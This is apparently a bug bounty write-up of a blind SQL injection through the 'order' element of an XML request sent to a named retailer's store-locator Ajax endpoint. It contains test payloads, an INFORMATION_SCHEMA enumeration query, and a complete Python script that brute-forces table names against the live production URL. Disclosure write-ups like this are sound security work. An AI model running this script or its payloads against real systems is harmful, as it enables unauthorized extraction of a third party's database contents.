Sqli in Xml on Order by

The bug description Link to heading

On a Bug Bounty website, there is an endpoint for Ajax calls.

This call contains a GET xml_request argument, containing XML encoded using url_encode.

A decoded example of expected XML:

<request>
    <appkey>CFCAC866-ADF8-11E3-AC4F-1340B945EC6E</appkey>
    <formdata id="getlist">
        <objectname>Country</objectname>
    </formdata>
</request>

XML can contain other pieces than objectname, for the SQLi bug we will focus on order:

<request>
    <appkey>******************************</appkey>
    <formdata id="getlist">
        <order>18</order>
        <objectname>Country</objectname>
    </formdata>
</request>

Steps To Reproduce: Link to heading

In order to validate the SQL Injection, we made this first payload:

<request>
    <appkey>**********************************</appkey>
    <formdata id="getlist">
        <order>18--BAD</order>
        <objectname>Country</objectname>
    </formdata>
</request>

Which will give this url: payload url

While an error would have been triggered if the flaw weren’t present, no error occurs because – acts as a comment, and thus the BAD content is not interpreted.

To exploit this bug, we now need to be cunning in order to extract information.

To do this, the SQL query probably has this form:

SELECT * FROM w2gi.country ORDER BY 1--BAD

To determine the results, we will proceed as follows:

  • If a condition is OK, we will return a result.
  • If a condition is *NOT OK, we will return 0 results.

The condition we’re interested in for our PoC is discovering table’s name.

Here’s the basic SQL query:

SELECT * FROM country ORDER BY 1 LIMIT (CASE WHEN (SELECT COUNT(table_name) FROM INFORMATION_SCHEMA.TABLES WHERE table_schema LIKE 'w2gi' AND table_name LIKE 'coun%' LIMIT 1) > 0 THEN 1 ELSE 0 END)

Simply add a character after coun to determine whether or not it exists.

  • couna will return an empty result (LIMIT 0)
  • count will return a result (LIMIT 1) We take this example because we already know country exist.

We still need to develop a script to automate everything.

The full PoC with code Link to heading

To validate the bug and its critical scope, we opted for a simple read of the database tables to minimize any risk of real impact. We should extract all data in all the databases, but we only PoC with table name.

However, a malicious attacker could write directly to the database, via nested queries, and even write into external files via “INTO OUTFILE” functions, potentially compromising the entire server.

Here is a Python Script, we made it to discover a table name (you can specify the beginning of the table name)

import requests
import urllib3
urllib3.disable_warnings()

cookies = {}

headers = {
    'Host': 'locations.vans.com',
    'User-Agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:137.0) Gecko/20100101 Firefox/137.0',
    'Accept': 'text/javascript, text/html, application/xml, text/xml, */*',
    'Accept-Language': 'fr,fr-FR;q=0.8,en-US;q=0.5,en;q=0.3',
    'Accept-Encoding': 'gzip, deflate, br, zstd',
    'X-Requested-With': 'XMLHttpRequest',
    'X-Prototype-Version': '1.7.2',
    'Connection': 'keep-alive',
    'Referer': 'https://locations.vans.com/',
    'Sec-Fetch-Dest': 'empty',
    'Sec-Fetch-Mode': 'cors',
    'Sec-Fetch-Site': 'same-origin',
    'Priority': 'u=0',
}

sql_injection_template = "1 LIMIT (CASE WHEN (SELECT COUNT(table_name) FROM INFORMATION_SCHEMA.TABLES WHERE table_schema LIKE %27w2gi%27 AND table_name LIKE %27{{TABLE_NAME}}%25%27 LIMIT 1) %3E 0 THEN 1 ELSE 0 END)"

chars = 'abcdefghijklmnopqrstuvwxyz0123456789_'
round_iterator = 0

current_table_name_found = 'v'

while True:
    if round_iterator == len(chars):
        print("==> " + current_table_name_found)
        exit()

    sql_injection = sql_injection_template.replace("{{TABLE_NAME}}", current_table_name_found + chars[round_iterator])


    sql_injection = sql_injection.replace(" ", "%20")
    response = requests.get(
        'https://locations.vans.com:443/ajax?lang=fr_FR&isSOCiLocator=true&xml_request=%3Crequest%3E%0A%20%20%20%20%3Cappkey%3ECFCAC866-ADF8-11E3-AC4F-1340B945EC6E%3C/appkey%3E%0A%20%20%20%20%3Cformdata%20id=%22getlist%22%3E%0A%20%20%20%20%20%20%20%20%3Corder%3E' + sql_injection + '%3C/order%3E%0A%20%20%20%20%20%20%20%20%3Cobjectname%3ECountry%3C/objectname%3E%0A%20%20%20%20%3C/formdata%3E%0A%3C/request%3E',
        cookies=cookies,
        headers=headers,
        verify=False,

    )

    if len(response.text) > len('<?xml version="1.0" encoding="UTF-8"?><response code="1006"><message><text>No records available</text></message></response>'):
        current_table_name_found += chars[round_iterator]
        print("NEW CHAR => " + chars[round_iterator] + " (" + current_table_name_found + ")")
        round_iterator = 0
    else:
        round_iterator += 1
